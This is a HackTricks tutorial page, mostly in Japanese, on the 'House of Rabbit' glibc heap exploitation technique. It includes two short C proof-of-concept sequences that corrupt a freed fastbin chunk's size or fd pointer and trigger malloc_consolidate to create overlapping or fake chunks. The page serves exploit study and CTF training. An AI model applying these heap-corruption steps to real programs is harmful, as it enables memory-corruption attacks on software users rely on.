# House of Rabbit

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### 要件

1. **ファストビンのfdポインタまたはサイズを変更する能力**: これは、ファストビン内のチャンクの前方ポインタまたはそのサイズを変更できることを意味します。
2. **`malloc_consolidate`をトリガーする能力**: これは、大きなチャンクを割り当てるか、トップチャンクをマージすることで行うことができ、ヒープがチャンクを統合することを強制します。

### 目標

1. **オーバーラップするチャンクを作成する**: 1つのチャンクが別のチャンクとオーバーラップするようにし、さらなるヒープ操作を可能にします。
2. **偽のチャンクを作成する**: ヒープ操作中にアロケータを騙して、偽のチャンクを正当なチャンクとして扱わせることです。

## 攻撃の手順

### POC 1: ファストビンチャンクのサイズを変更する

**目的**: ファストビンチャンクのサイズを操作してオーバーラップするチャンクを作成します。

* **ステップ 1: チャンクを割り当てる**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
We allocate two chunks of 0x40 bytes each. These chunks will be placed in the fast bin list once freed.

* **ステップ 2: チャンクを解放する**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
We free both chunks, adding them to the fastbin list.

* **ステップ 3: チャンクサイズの変更**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
We change the size metadata of `chunk1` to 0xa1. This is a crucial step to trick the allocator during consolidation.

* **ステップ 4: `malloc_consolidate` をトリガーする**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
大きなチャンクを割り当てると、`malloc_consolidate`関数がトリガーされ、小さなチャンクがファストビンでマージされます。操作された`chunk1`のサイズにより、`chunk1`が`chunk2`と重なります。

統合後、`chunk1`は`chunk2`と重なり、さらなる悪用が可能になります。

### POC 2: `fd`ポインタを変更する

**目的**: ファストビンの`fd`ポインタを操作してフェイクチャンクを作成します。

* **ステップ 1: チャンクを割り当てる**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**説明**: 偽のチャンクのためにヒープを設定するために、1つは小さく、もう1つは大きい2つのチャンクを割り当てます。

* **ステップ 2: 偽のチャンクを作成**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
We write fake chunk metadata into `chunk2` to simulate smaller chunks.

* **ステップ 3: `chunk1` を解放する**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**説明**: `chunk1`を解放し、fastbinリストに追加します。

* **ステップ 4: `chunk1`の`fd`を変更する**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**説明**: `chunk1`の前方ポインタ（`fd`）を変更して、`chunk2`内の偽チャンクを指すようにします。

* **ステップ5: `malloc_consolidate`をトリガーする**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
大きなチャンクを再度割り当てると、`malloc_consolidate`がトリガーされ、偽のチャンクが処理されます。

偽のチャンクはファストビンリストの一部となり、さらなる悪用のための正当なチャンクとなります。

### 概要

**House of Rabbit**技術は、ファストビンチャンクのサイズを変更してオーバーラップするチャンクを作成するか、`fd`ポインタを操作して偽のチャンクを作成することを含みます。これにより、攻撃者はヒープ内に正当なチャンクを偽造し、さまざまな形態の悪用を可能にします。これらのステップを理解し、実践することで、ヒープの悪用スキルを向上させることができます。

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
